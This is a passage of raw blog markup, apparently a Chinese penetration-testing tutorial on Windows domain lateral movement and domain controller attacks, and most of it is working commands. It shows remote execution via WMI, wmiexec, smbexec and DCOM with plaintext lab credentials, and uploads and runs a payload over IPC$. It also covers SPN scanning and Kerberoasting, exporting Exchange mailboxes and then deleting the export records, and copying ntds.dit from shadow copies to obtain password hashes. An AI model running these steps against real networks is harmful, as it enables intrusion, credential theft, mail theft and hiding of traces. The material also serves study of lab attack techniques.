class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:10.10.10.11 /user:de1ay /password:274355ZWz process call create <span class="hljs-string">&quot;cmd.exe&quot;</span> /c ipconfig&gt;C:\ip.txt<span class="hljs-string">&quot;</span><br><span class="hljs-string">#查看执行结果</span><br><span class="hljs-string">type \\10.10.10.11\c$\ip.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214128889.png" alt="image-20240107214128889"></p><ul><li><strong>impacket 工具包中的wmiexec</strong><br>进入&#x2F;usr&#x2F;local&#x2F;bin目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 wmiexec.py  de1ay:274355ZWz@192.168.252.16<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214138706.png" alt="image-20240107214138706"></p><ul><li><strong>wmiexec.vbs</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.11 de1ay 274355ZWz<br><span class="hljs-comment">#在远程主机上执行命令</span><br>csrcipt.exe wmiexec.vbs /cmd 10.10.10.11 de1ay 274355ZWz <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214207506.png" alt="image-20240107214207506"></p><ul><li><strong>Invoke-WmiCommand.ps1</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span>     // 指定目标系统用户名<br><span class="hljs-variable">$Password</span> = ConvertTo-SecureString -String <span class="hljs-string">&quot;明文密码&quot;</span> -AsPlainText -Force   // 指定目标系统的密码<br><span class="hljs-variable">$Cred</span> = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>    // 将账号和密码整合起来，以便导入credential<br><span class="hljs-variable">$Remote</span> = Invoke-WmiCommand -Payload &#123;要执行的命令&#125; -Credential <span class="hljs-variable">$Cred</span> -ComputerName 目标IP<br><span class="hljs-variable">$Remote</span>.PayloadOutput       // 将执行结果输出到屏幕上<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214216404.png" alt="image-20240107214216404"></p><ul><li><strong>Invoke-WMIMethod</strong><br>利用powershell自带得invoke-wmimethod，可以在远程系统中执行命令和指定程序。在powershell命令行环境中执行如下命令，可以以非交互式的方式执行命令，但不会回显。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;de1ay\de1ay&quot;</span><br><span class="hljs-variable">$Password</span>=ConvertTo-SecureString -String <span class="hljs-string">&quot;274355ZWz&quot;</span> -AsplainText -force<br><span class="hljs-variable">$Cred</span>=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br> Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList <span class="hljs-string">&quot;calc.exe&quot;</span> -ComputerName <span class="hljs-string">&quot;10.10.10.11&quot;</span> -Credential <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure><p>目标系统交互运行calc.exe程序。</p><ul><li><strong>smbexec使用</strong><br>impackt工具包中的smbexec.py</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbexec.py de1ay/de1ay:274355ZWz@192.168.43.16<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214227028.png" alt="image-20240107214227028"></p><h2 id="DCOM在远程系统中的使用"><a href="#DCOM在远程系统中的使用" class="headerlink" title="DCOM在远程系统中的使用"></a>DCOM在远程系统中的使用</h2><p>DCOM(分布式组件对象模型)是微软的一系列概念和接口。通过DCOM，客户端程序对象能过够向网络中另一台计算机上的服务器程序对象发送请求。</p><ul><li><strong>通过本地DCOM执行命令</strong><br>1.获取DCOM程序列表<br>Get-CimInstance这个cmdlet(powershell命令)默认只在powershell3.0以上版本中存在。也就是说，只有windows server2012及以上的版本才可以使用Get-CimInstance。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-CimInstance  Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214239958.png" alt="image-20240107214239958"><br>因为windows7,server2008默认安装的是powershell2.0，所以它们都不支持Get-CimInstance.可以使用如下命令代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-WmiObject -Namespace  ROOT\CIMV2 -Class Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214251386.png" alt="image-20240107214251386"></p><ul><li><strong>使用DCOM执行任意命令</strong><br>在本地启动一个管理员权限的powershell</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimzed&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214301108.png" alt="image-20240107214301108"></p><ul><li><strong>使用DCOM在远程机器上执行命令</strong><br>在使用该方法时，必须使用具有本地管理员权限的账户<br>1.通过ipc$连接远程计算机</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\10.10.10.11 <span class="hljs-string">&quot;274355ZWz&quot;</span> /user:de1ay<br></code></pre></td></tr></table></figure><p>2.调用MMC20.Application远程执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c c:\one.exe&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br></code></pre></td></tr></table></figure><p>先通过ipc将payload上传到目标机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy one.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure><p>在执行上述命令<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214312621.png" alt="image-20240107214312621"><br>上线，并且是管理员权限<br>3.调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[Type]::GetTypeFromCLSID(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>)<br><span class="hljs-variable">$obj</span>=[System.Activator]::CreateInstance(<span class="hljs-variable">$com</span>)<br><span class="hljs-variable">$item</span>=<span class="hljs-variable">$obj</span>.item()<br><span class="hljs-variable">$item</span>.Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c c:\one&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,0)<br><br></code></pre></td></tr></table></figure><h2 id="SPN在域环境中的应用"><a href="#SPN在域环境中的应用" class="headerlink" title="SPN在域环境中的应用"></a>SPN在域环境中的应用</h2><p>windows域环境是基于微软的活动目录服务工作的，它在网路系统环境中将物理位置分散、所属部门不同的用户进行分组，集中资源管理。有效的地对资源访问控制权限进行细粒度的分配，提高了网路环境的安全性及网络资源统一分配管理的便利性。</p><p>SPN命令的格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">SPN=serviceclass <span class="hljs-string">&quot;/&quot;</span> hostname [<span class="hljs-string">&quot;:&quot;</span>port] [<span class="hljs-string">&quot;/&quot;</span> servicename]<br> <br>serviceclass 服务组件的名称<br>hostname 以<span class="hljs-string">&quot;/&quot;</span>与面的名称分隔，是计算机的FQDN（全限定域名，同时带有计算机名和域名)<br>port  以冒号分隔，后面的内容为该服务监听的端口<br>servicename  一个字符串，可以是服务的专有名称<br></code></pre></td></tr></table></figure><p>常见的SPN服务<br>mssql服务的示列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSSQLSvc/computer1.pentest.com:1433<br>MSSQLSvc  服务组件的名称，此处为mssql服务<br>computer.pentest.com 主机名为computer,域名为pentest.com<br>1433 监听端口为1433<br></code></pre></td></tr></table></figure><p>servicecass和hostname是必选参数,port和servicename是可选参数</p><ul><li><strong>SPN扫描的powershell脚本</strong><br><a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a><br>SPN扫描也称作“扫描Kerberos服务实例名称”<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214322417.png" alt="image-20240107214322417"><br>这里面有很多扫描spn服务的脚本也有扫描所有服务的<br>1.扫描mssql服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-moudle .\Discover-PSMSSQL-Servers.ps1<br>Discover-PSMSSQLServers<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214332855.png" alt="image-20240107214332855"><br>2.扫描所有服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module .\Discover-PSInteresestingServices.ps1<br>Discover-PSInteresestingServices<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214344646.png" alt="image-20240107214344646"></p><p>在不使用第三方powershell脚本的情况下,输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214358364.png" alt="image-20240107214358364"></p><ul><li><p><strong>Kerberoast攻击分析与防范</strong></p><p>1.配置mssql服务 ，破解该服务的票据<br>手动注册</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -A MSSQLSvc/computer.de1ay.com:1433  mssql<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214409269.png" alt="image-20240107214409269"><br>     2.查看用户对应的SPN<br>    查看指定用户注册的SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -L de1ay.com\mssql<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214422225.png" alt="image-20240107214422225"><br>    查看所有注册的SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure><p>​3.配置指定服务的登录权限<br>​在活动目录中为用户配置指定服务的登录权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc \Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Log on as a service <br></code></pre></td></tr></table></figure><p>​4.修改加密类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc\Computer Configuration\Windows Setting\Security Settings\Local Policies\Seurity Options\Network security: Configure encryption types allowed <span class="hljs-keyword">for</span> Kerberos<br></code></pre></td></tr></table></figure><p>​5.请求SPN Kerberos票据<br>​打开powershell输入如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Add-Type -AssemblyName System.IdentityModel <br>New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken -ArgumentList <span class="hljs-string">&quot;MSSQLSvc/de1ay.de1ay.com&quot;</span><br></code></pre></td></tr></table></figure><p>​两篇干货文章</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA%3D%3D&amp;chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&amp;idx=1&amp;mid=2247488936&amp;scene=21&amp;sn=82c127c8ad6d3e36f1a977e5ba122228<span class="hljs-comment">#wechat_redirect</span><br><br>https://blog.csdn.net/shuteer_xu/article/details/106030671<br><br></code></pre></td></tr></table></figure><h2 id="Exchange邮件服务"><a href="#Exchange邮件服务" class="headerlink" title="Exchange邮件服务"></a>Exchange邮件服务</h2><ul><li><strong>Exchange服务发现</strong><br>1.基于端口发现<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A -O -sV 192.168.43.1<br></code></pre></td></tr></table></figure>2.SPN查询<br>在安装Exchange时，SPN就被注册在活动目录中了。在域环境中通过SPN来发现Exchange服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T de1ay.com -F -Q */*<br></code></pre></td></tr></table></figure><ul><li><strong>Exchange的基本操作</strong><br>Exchange是一个电子邮件系统，那么其中必然存在数据库。Exchange数据库的后缀为”.edb”。.<br>1.查看邮件数据库<br>在powershell命令行环境中输入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxDatabase -server <span class="hljs-string">&quot;Exchange1&quot;</span><br></code></pre></td></tr></table></figure>在正常的powershell中没有这条命令的，需要输入如下命令。将Exchange管理单元添加到当前会话。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">add-pssnapin microsoft.exchange*<br></code></pre></td></tr></table></figure><p>可以指定数据库，对其详细信息进行查询。查询数据库物理路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxDatabase -Identity <span class="hljs-string">&#x27;Mailbox Database 188899384&#x27;</span> | Format-List Name,EdbFilePath,LogFolderPath<br></code></pre></td></tr></table></figure><p>2.获取现有用户的邮件地址<br>使用powershell进行查询，列举Exchange中所有的用户及其邮件地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Mailbox | format-tables Name,WindowsEmaiAddress<br></code></pre></td></tr></table></figure><p>3.查看指定用户的邮箱使用信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">get-mailboxstatistics -identity administrator | select DisplayName,ItemCount,TotalItemSize,LastLogonTime<br></code></pre></td></tr></table></figure><p>4.获取用户邮箱中的邮件数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize -Descend<br></code></pre></td></tr></table></figure><ul><li><strong>导出指定的电子邮件</strong><br>Exchange邮件的文件后缀为“.pst”,在Exchange server 2007中导出邮件，需要使用Export-Mailbox命令。在Exchange Server 2010 SP1及以后的版本的Exchange中导出邮件，可以使用 图形化界面，也可以使用powershell<br>1.配置用户导出\导出的权限<br>查看有导入导出权限的用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-ManagementRoleAssignment -role <span class="hljs-string">&quot;Mailbox Import Export&quot;</span> | Format-List RoleAssigneeName<br></code></pre></td></tr></table></figure><p>2.添加权限<br>将Adminstrator用户添加到Mailbox Import Export角色中，就可以通过Powershell导出用户的邮件了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">New-ManagementRoleAssignment -Name <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> -User <span class="hljs-string">&quot;Administrator&quot;</span> -Role <span class="hljs-string">&quot;Mailbox Import Export&quot;</span><br></code></pre></td></tr></table></figure><p>3.删除权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove-ManagementRoleAssignment  <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> -Confirm:<span class="hljs-variable">$false</span><br></code></pre></td></tr></table></figure><p>在将用户添加到角色组中，需要重启Exchange服务器才能执行导出操作</p><ul><li><strong>设置网络共享文件夹</strong><br>不论那种方式导出邮件，都需要将文件放置在UNC（共享文件)路径下</li></ul><p>设置共享文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net share inetpub=c:\inetpub /grant:everyone,full<br></code></pre></td></tr></table></figure><p>设置成功后可以是使用net share查看</p><ul><li><strong>导出用户的电子邮件</strong><br>1.使用powershell导出电子邮件<br>用户的电子邮箱目录一般分为Inbox(收件箱），SentItems（已发送邮件),DeletedItems（已删除邮件),Drafts（草稿)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">New-MailboxExportRequest -Mailbox administrator -FilePath \\10.10.10.11\inetpub\administrator.pst<br></code></pre></td></tr></table></figure><ul><li><strong>管理导出请求</strong><br>不论是使用powershell导出电子邮件，还是图形化都会留下相关信息。<br>在powershell中输入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest<br></code></pre></td></tr></table></figure><p>查看导出请求<br>使用如下命令可以将指定用户的已完成导出请求删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove-MailboxExportRequest -Identity Administrator\mailboxexport<br></code></pre></td></tr></table></figure><p>使用如下命令可以将所有已完成的导出请求删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域内横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域控制器安全</title>
    <link href="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <url>/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通常情况下，即使拥有管理员权限，也无法读取域控制器中的C:\windows\NTDS\ntds.dit文件（活动目录始终访问这个文件）。使用windows本地卷影拷贝服务，就可以获得文件的副本。</p><h2 id="使用卷影拷贝服务提取ntds-dit"><a href="#使用卷影拷贝服务提取ntds-dit" class="headerlink" title="使用卷影拷贝服务提取ntds.dit"></a>使用卷影拷贝服务提取ntds.dit</h2><p>在活动目录中，所有的数据都保存在ntds.dit文件中。ntds.dit是一个二进制文件，储存位置为域控制器的%SystemRoot%\ntds\ntds.dit。ntds.dit中包含(但不限于)用户名，散列值，组，GPP，OU等与活动目录相关的信息。它和SAM文件一样，是被Windows操作系统锁定的。</p><ul><li><strong>使用ntdsutil.exe提取ntds.dit</strong><br>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe,可以维护和管理活动目录数据库，控制单个主机操作，创建引用程序目录分区，删除由未使用活动目录安装向导成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，也可以通过域内机器在域控制器上远程操作。ntdsutil.exe支持的操作系统由windows server2003,windows server 2008,windwos server  2012。</li></ul><p>在域控制器的命令行环境中输入如下命令，创建快照。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;activate instance ntds&quot;</span> create quit quit<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171533778.png" alt="image-20240107171533778"></p><p>可以看到创建了一个GUID为0c5ecd15-d722-41fa-9e0a-424c4d19ac64的快照</p><p>加载刚刚的快照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;mount &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171646050.png" alt="image-20240107171646050">使用如下命令将文件复制出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy C:\$SNAP_202106071917_VOLUMEC$\windows\ntds\ntds.dit  c:\temp\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171654449.png" alt="image-20240107171654449">输入如下命令将之前加载的快照卸载并删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;unmount &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> <span class="hljs-string">&quot;delete &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171703160.png" alt="image-20240107171703160"></p><p>查看当前系统中的所有快照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;List All&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171710594.png" alt="image-20240107171710594"><br>之前创的没有删除所以有这么多</p><ul><li><strong>利用vssadmin提取ntds,dit</strong><br>vssadmin是windows server 2008 及windows 7提供的vss管理工具，可用于创建和删除卷影拷贝，列出卷影拷贝的信息（只能管理系统provider创建的卷影拷贝),显示已安装的所有卷影拷贝写入程序(writers)和提供程序(providers)，以及改变卷影拷贝的储存空间。</li></ul><p>创建一个c盘卷影</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vssadmin create shadow /for=c:<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171950663.png" alt="image-20240107171950663"></p><p>在创建的卷影拷贝中将ntds.dit复制出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit  c:\ntds.dit<br></code></pre></td></tr></table></figure><p><img 